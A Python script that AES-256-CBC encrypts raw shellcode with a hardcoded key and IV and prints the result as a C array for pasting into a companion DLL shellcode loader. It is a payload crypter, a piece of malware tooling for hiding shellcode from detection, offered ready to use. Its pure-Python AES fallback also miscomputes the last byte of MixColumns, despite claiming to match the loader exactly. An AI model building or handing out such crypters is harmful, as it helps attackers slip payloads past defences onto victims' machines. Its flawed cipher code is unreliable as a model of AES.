#!/usr/bin/env python3
"""
encrypt_aes256.py — AES-256-CBC encrypt raw shellcode for the C++ loader

Usage:
  python3 encrypt_aes256.py shellcode.bin                          (pipe to stdout)
  python3 encrypt_aes256.py shellcode.bin > shellcode_encrypted.h  (save C array)

The encrypted blob can be pasted directly into kEncryptedShellcode[] in
aes256_loader_dll.cpp.  The key + IV below MUST match the C++ loader exactly.
"""

import sys
import os
from hashlib import sha256

# ============================================================
# CONFIG — MUST match aes256_loader_dll.cpp
# ============================================================

AES_KEY = bytes([
    0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6, 0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C,
    0x76, 0x2E, 0x71, 0x60, 0xF3, 0x8B, 0x45, 0x6D, 0xF5, 0x3A, 0x67, 0x6C, 0x4D, 0xA1, 0xBC, 0xDE,
])

AES_IV = bytes([
    0x5A, 0xE6, 0x1B, 0x3C, 0x8F, 0x72, 0x4D, 0x90, 0x17, 0xBE, 0x23, 0x48, 0xE9, 0x0C, 0x65, 0xFA,
])

# ============================================================

def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    """PKCS#7 padding."""
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len] * pad_len)


def aes256_cbc_encrypt(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    """
    AES-256-CBC encryption using pure Python + PyCryptodome (if available)
    or fall back to the standard library / cryptography package.
    """
    # Prefer PyCryptodome
    try:
        from Crypto.Cipher import AES
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return cipher.encrypt(plaintext)
    except ImportError:
        pass

    # Fall back to cryptography
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        return encryptor.update(plaintext) + encryptor.finalize()
    except ImportError:
        pass

    # Last resort: pure-Python AES (slow, no dependencies)
    return _pure_aes256_cbc_encrypt(plaintext, key, iv)


# ============================================================
# Pure-Python AES-256-CBC (matches the C++ loader exactly)
# Only used if no crypto library is available.
# ============================================================

_SBOX = (
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
)

_RCON = (0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36)


def _gf_mul(a: int, b: int) -> int:
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        carry = a & 0x80
        a = (a << 1) & 0xFF
        if carry:
            a ^= 0x1B
        b >>= 1
    return p


def _key_expansion(key: bytes):
    """AES-256 key expansion → 15 round keys of 16 bytes each."""
    w = [[0]*4 for _ in range(60)]
    for i in range(8):
        w[i][0] = key[i*4+0]
        w[i][1] = key[i*4+1]
        w[i][2] = key[i*4+2]
        w[i][3] = key[i*4+3]

    for i in range(8, 60):
        t = w[i-1][:]
        if i % 8 == 0:
            t = [_SBOX[t[1]], _SBOX[t[2]], _SBOX[t[3]], _SBOX[t[0]]]
            t[0] ^= _RCON[i // 8]
        elif i % 8 == 4:
            t = [_SBOX[t[0]], _SBOX[t[1]], _SBOX[t[2]], _SBOX[t[3]]]
        for j in range(4):
            w[i][j] = w[i-8][j] ^ t[j]

    rk = []
    for r in range(15):
        round_key = bytearray(16)
        for j in range(4):
            base = 4 * (r * 4 + j)
            round_key[j*4+0] = w[r*4+j][0]
            round_key[j*4+1] = w[r*4+j][1]
            round_key[j*4+2] = w[r*4+j][2]
            round_key[j*4+3] = w[r*4+j][3]
        rk.append(bytes(round_key))
    return rk


def _sub_bytes(state: bytearray):
    for i in range(16):
        state[i] = _SBOX[state[i]]


def _shift_rows(state: bytearray):
    state[1], state[5], state[9], state[13] = state[5], state[9], state[13], state[1]
    state[2], state[10] = state[10], state[2]
    state[6], state[14] = state[14], state[6]
    state[3], state[7], state[11], state[15] = state[15], state[3], state[7], state[11]


def _mix_columns(state: bytearray):
    for i in range(4):
        c = i * 4
        a0, a1, a2, a3 = state[c], state[c+1], state[c+2], state[c+3]
        state[c]   = _gf_mul(a0, 2) ^ _gf_mul(a1, 3) ^ a2 ^ a3
        state[c+1] = a0 ^ _gf_mul(a1, 2) ^ _gf_mul(a2, 3) ^ a3
        state[c+2] = a0 ^ a1 ^ _gf_mul(a2, 2) ^ _gf_mul(a3, 3)
        state[c+3] = _gf_mul(a0, 3) ^ a1 ^ a2 ^ _gf_mul(a2, 2)


def _add_round_key(state: bytearray, rk: bytes):
    for i in range(16):
        state[i] ^= rk[i]


def _aes256_encrypt_block(block: bytes, rkeys: list) -> bytes:
    state = bytearray(block)
    _add_round_key(state, rkeys[0])
    for r in range(1, 14):
        _sub_bytes(state)
        _shift_rows(state)
        _mix_columns(state)
        _add_round_key(state, rkeys[r])
    _sub_bytes(state)
    _shift_rows(state)
    _add_round_key(state, rkeys[14])
    return bytes(state)


def _pure_aes256_cbc_encrypt(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    """Pure-Python AES-256-CBC encrypt (byte-for-byte identical to C++ loader)."""
    rkeys = _key_expansion(key)
    ciphertext = bytearray()
    prev = bytearray(iv)
    for i in range(0, len(plaintext), 16):
        block = bytearray(plaintext[i:i+16])
        for j in range(16):
            block[j] ^= prev[j]
        ct_block = _aes256_encrypt_block(bytes(block), rkeys)
        ciphertext.extend(ct_block)
        prev = bytearray(ct_block)
    return bytes(ciphertext)


# ============================================================
# Output formatting
# ============================================================

def format_c_array(data: bytes, name: str = "kEncryptedShellcode", indent: int = 4) -> str:
    """Format bytes as a C/C++ static const array with 16 hex bytes per line."""
    prefix = " " * indent
    lines = []
    lines.append(f"static const unsigned char {name}[] = {{")
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_bytes = ", ".join(f"0x{b:02X}" for b in chunk)
        if i + 16 < len(data):
            lines.append(f"{prefix}{hex_bytes},")
        else:
            lines.append(f"{prefix}{hex_bytes}")
    lines.append(f"}};")
    lines.append(f"static const SIZE_T kEncryptedSize = sizeof({name});")
    return "\n".join(lines)


# ============================================================
# Main
# ============================================================

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 encrypt_aes256.py <shellcode.bin> [--raw]", file=sys.stderr)
        print("", file=sys.stderr)
        print("  shellcode.bin   Raw shellcode file (binary)", file=sys.stderr)
        print("  --raw           Output raw bytes instead of C array", file=sys.stderr)
        print("", file=sys.stderr)
        print("Defaults to C array output for pasting into kEncryptedShellcode[].", file=sys.stderr)
        sys.exit(1)

    filename = sys.argv[1]
    raw_output = "--raw" in sys.argv

    if not os.path.isfile(filename):
        print(f"Error: file not found: {filename}", file=sys.stderr)
        sys.exit(1)

    with open(filename, "rb") as f:
        shellcode = f.read()

    if len(shellcode) == 0:
        print("Error: shellcode file is empty", file=sys.stderr)
        sys.exit(1)

    # Pad with PKCS#7 to block size
    padded = pkcs7_pad(shellcode, 16)

    # Encrypt
    ciphertext = aes256_cbc_encrypt(padded, AES_KEY, AES_IV)

    if raw_output:
        sys.stdout.buffer.write(ciphertext)
        return

    # Print C array
    print("// Auto-generated by encrypt_aes256.py")
    print(f"// Input: {filename} ({len(shellcode)} bytes shellcode)")
    print(f"// Padded: {len(padded)} bytes, Ciphertext: {len(ciphertext)} bytes")
    print(f"// Paste into aes256_loader_dll.cpp, replacing kEncryptedShellcode[]")
    print()
    print(format_c_array(ciphertext))


if __name__ == "__main__":
    main()